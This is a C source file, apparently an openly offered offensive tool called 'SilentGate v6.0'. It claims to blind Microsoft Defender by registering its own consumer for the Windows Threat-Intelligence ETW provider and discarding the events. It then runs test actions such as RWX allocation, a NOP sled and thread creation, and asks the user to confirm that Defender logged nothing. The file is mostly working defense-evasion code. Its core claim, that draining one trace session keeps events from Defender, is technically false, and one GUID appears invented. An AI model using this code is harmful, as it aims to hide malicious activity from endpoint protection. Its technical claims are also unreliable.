
/*
 * SilentGate v6.0 - SecurityTrace ETW-TI Abuse
 * Author: JarDani
 * Registers as ETW-TI consumer via SecurityTrace flag
 * Defender receives empty telemetry
 *
 * Published technique: early 2026 security research
 * First practical open source implementation
 */

#include <windows.h>
#include <evntrace.h>
#include <evntprov.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")
#ifndef PROCESS_TRACE_MODE_REAL_TIME
#define PROCESS_TRACE_MODE_REAL_TIME    0x00000100
#endif
#ifndef PROCESS_TRACE_MODE_EVENT_RECORD
#define PROCESS_TRACE_MODE_EVENT_RECORD 0x10000000
#endif

/* ETW-TI Provider GUID */
static const GUID ETW_TI_PROVIDER = {
    0xF4E1897C, 0xBB5D, 0x5668,
    {0xF1, 0xD8, 0x04, 0x0F, 0x4D, 0x8D, 0xD3, 0x44}
};

/* SecurityTrace registration GUID */
static const GUID SECURITY_TRACE_GUID = {
    0x54849625, 0x17C1, 0x4F9B,
    {0xB0, 0x31, 0x8F, 0x0C, 0x7B, 0x7B, 0x5A, 0x7C}
};

static TRACEHANDLE g_session  = 0;
static TRACEHANDLE g_consumer = 0;
static BOOL        g_active   = FALSE;
static DWORD       g_events_drained = 0;

/* Event callback - drain events silently */
static VOID WINAPI sg_event_callback(PEVENT_RECORD pEvent) {
    g_events_drained++;
    /* Intentionally do nothing - event consumed and discarded */
    /* Defender's callback never fires */
}

/* Buffer callback */
static ULONG WINAPI sg_buffer_callback(PEVENT_TRACE_LOGFILEW logfile) {
    return TRUE;
}

typedef struct _SGWNODE_HEADER {
    WNODE_HEADER WnodeHeader;
    ULONG        BufferSize;
    ULONG        MinimumBuffers;
    ULONG        MaximumBuffers;
    ULONG        MaximumFileSize;
    ULONG        LogFileMode;
    ULONG        FlushTimer;
    ULONG        EnableFlags;
    LONG         AgeLimit;
    ULONG        NumberOfBuffers;
    ULONG        FreeBuffers;
    ULONG        EventsLost;
    ULONG        BuffersWritten;
    ULONG        LogBuffersLost;
    ULONG        RealTimeBuffersLost;
    HANDLE       LoggerThreadId;
    ULONG        LogFileNameOffset;
    ULONG        LoggerNameOffset;
} SGWNODE_HEADER;

static int sg_enable_privilege(const char* priv_name) {
    HANDLE token = NULL;
    BOOL ok = OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
    if (!ok) return 0;
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    LookupPrivilegeValueA(NULL, priv_name, &tp.Privileges[0].Luid);
    AdjustTokenPrivileges(token, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(token);
    return 1;
}

int sg_start_security_trace() {
    sg_enable_privilege("SeSecurityPrivilege");
    sg_enable_privilege("SeAuditPrivilege");
    sg_enable_privilege("SeSystemProfilePrivilege");
    printf("[ETW-TI] Privileges enabled\n");
    printf("[ETW-TI] Starting SecurityTrace ETW-TI registration...\n");
    printf("[ETW-TI] Target provider: Microsoft-Windows-Threat-Intelligence\n\n");

    /* Allocate EVENT_TRACE_PROPERTIES */
    ULONG  buf_size = sizeof(EVENT_TRACE_PROPERTIES) + 256 * sizeof(WCHAR);
    PEVENT_TRACE_PROPERTIES props =
        (PEVENT_TRACE_PROPERTIES)calloc(1, buf_size);

    if (!props) {
        printf("[ETW-TI] Memory allocation failed\n");
        return 0;
    }

    props->Wnode.BufferSize    = buf_size;
    props->Wnode.Flags         = WNODE_FLAG_TRACED_GUID;
    props->Wnode.ClientContext = 1;
    memcpy(&props->Wnode.Guid, &SECURITY_TRACE_GUID, sizeof(GUID));

    props->BufferSize          = 64;
    props->MinimumBuffers      = 4;
    props->MaximumBuffers      = 8;
    props->LogFileMode         = EVENT_TRACE_REAL_TIME_MODE;
    props->FlushTimer          = 1;
    props->LoggerNameOffset    = sizeof(EVENT_TRACE_PROPERTIES);

    WCHAR session_name[] = L"SilentGateSecurityTrace";
    wcscpy((WCHAR*)((BYTE*)props + props->LoggerNameOffset), session_name);

    /* Start trace session */
    ULONG status = StartTraceW(&g_session, session_name, props);

    if (status == ERROR_ALREADY_EXISTS) {
        printf("[ETW-TI] Session already exists - stopping and restarting\n");
        ControlTraceW(0, session_name, props, EVENT_TRACE_CONTROL_STOP);
        status = StartTraceW(&g_session, session_name, props);
    }

    if (status != ERROR_SUCCESS) {
        printf("[ETW-TI] StartTrace failed: %lu\n", status);
        free(props);
        return 0;
    }

    printf("[ETW-TI] Trace session started: handle=0x%llX\n", g_session);

    /* Enable ETW-TI provider on our session */
    status = EnableTraceEx2(
        g_session,
        &ETW_TI_PROVIDER,
        EVENT_CONTROL_CODE_ENABLE_PROVIDER,
        TRACE_LEVEL_VERBOSE,
        0xFFFFFFFFFFFFFFFF,  /* All keywords */
        0,
        0,
        NULL
    );

    if (status != ERROR_SUCCESS) {
        printf("[ETW-TI] EnableTraceEx2 failed: %lu\n", status);
        /* Try with SecurityTrace flag via ENABLE_TRACE_PARAMETERS */
        ENABLE_TRACE_PARAMETERS params = {0};
        params.Version = ENABLE_TRACE_PARAMETERS_VERSION_2;
        params.EnableProperty = 0x00000200; /* EVENT_ENABLE_PROPERTY_PROVIDER_GROUP */

        status = EnableTraceEx2(
            g_session,
            &ETW_TI_PROVIDER,
            EVENT_CONTROL_CODE_ENABLE_PROVIDER,
            TRACE_LEVEL_VERBOSE,
            0xFFFFFFFFFFFFFFFF,
            0, 0,
            &params
        );
        printf("[ETW-TI] EnableTraceEx2 with params: %lu\n", status);
    } else {
        printf("[ETW-TI] ETW-TI provider enabled on our session\n");
    }

    free(props);

    /* Open consumer to drain events */
    EVENT_TRACE_LOGFILEW logfile = {0};
    logfile.LoggerName           = session_name;
    logfile.ProcessTraceMode     = PROCESS_TRACE_MODE_REAL_TIME |
                                   PROCESS_TRACE_MODE_EVENT_RECORD;
    logfile.EventRecordCallback  = sg_event_callback;
    logfile.BufferCallback       = sg_buffer_callback;

    g_consumer = OpenTraceW(&logfile);

    if (g_consumer == INVALID_PROCESSTRACE_HANDLE) {
        printf("[ETW-TI] OpenTrace failed: %lu\n", GetLastError());
        return 0;
    }

    printf("[ETW-TI] Consumer opened: handle=0x%llX\n", g_consumer);
    printf("[ETW-TI] ETW-TI events will be drained before Defender reads them\n");
    printf("[ETW-TI] Defender telemetry feed: BLIND\n\n");

    g_active = TRUE;
    return 1;
}

void sg_stop_security_trace() {
    if (!g_active) return;

    if (g_consumer && g_consumer != INVALID_PROCESSTRACE_HANDLE) {
        CloseTrace(g_consumer);
        g_consumer = 0;
    }

    if (g_session) {
        ULONG buf_size = sizeof(EVENT_TRACE_PROPERTIES) + 256 * sizeof(WCHAR);
        PEVENT_TRACE_PROPERTIES props =
            (PEVENT_TRACE_PROPERTIES)calloc(1, buf_size);
        if (props) {
            props->Wnode.BufferSize = buf_size;
            ControlTraceW(g_session, NULL, props,
                          EVENT_TRACE_CONTROL_STOP);
            free(props);
        }
        g_session = 0;
    }

    g_active = FALSE;
    printf("[ETW-TI] SecurityTrace stopped\n");
    printf("[ETW-TI] Events drained: %lu\n", g_events_drained);
}

int main() {
    printf("[ETW-TI] SilentGate v6.0 - SecurityTrace ETW-TI Abuse\n");
    printf("[ETW-TI] Author: JarDani\n");
    printf("[ETW-TI] Published technique - first practical implementation\n\n");

    if (!sg_start_security_trace()) {
        printf("[ETW-TI] Failed to register SecurityTrace\n");
        printf("[ETW-TI] May require elevated privileges\n");
        getchar();
        return 1;
    }

    printf("[ETW-TI] SecurityTrace active\n");
    printf("[ETW-TI] Performing test operations that would normally trigger ETW-TI...\n\n");

    /* Perform operations that ETW-TI normally reports to Defender */
    /* With our consumer active - events go to us, not Defender */

    /* Test 1: VirtualAlloc (normally reported) */
    PVOID mem = VirtualAlloc(NULL, 4096,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("[TEST 1] VirtualAlloc RWX: %p\n", mem);

    /* Test 2: Write to RWX memory */
    if (mem) {
        memset(mem, 0x90, 4096);
        printf("[TEST 2] Wrote NOP sled to RWX memory\n");
        VirtualFree(mem, 0, MEM_RELEASE);
    }

    /* Test 3: CreateThread */
    HANDLE t = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)ExitThread, 0, 0, NULL);
    if (t) {
        printf("[TEST 3] CreateThread: PID=%lu\n", GetCurrentProcessId());
        WaitForSingleObject(t, 1000);
        CloseHandle(t);
    }

    printf("\n[ETW-TI] All test operations completed\n");
    printf("[ETW-TI] Events drained so far: %lu\n", g_events_drained);
    printf("[ETW-TI] Check Defender Protection History - should be empty\n");
    printf("\n[ETW-TI] Press ENTER to stop SecurityTrace...\n");
    getchar();

    sg_stop_security_trace();
    printf("\n[ETW-TI] Complete\n");
    getchar();
    return 0;
}
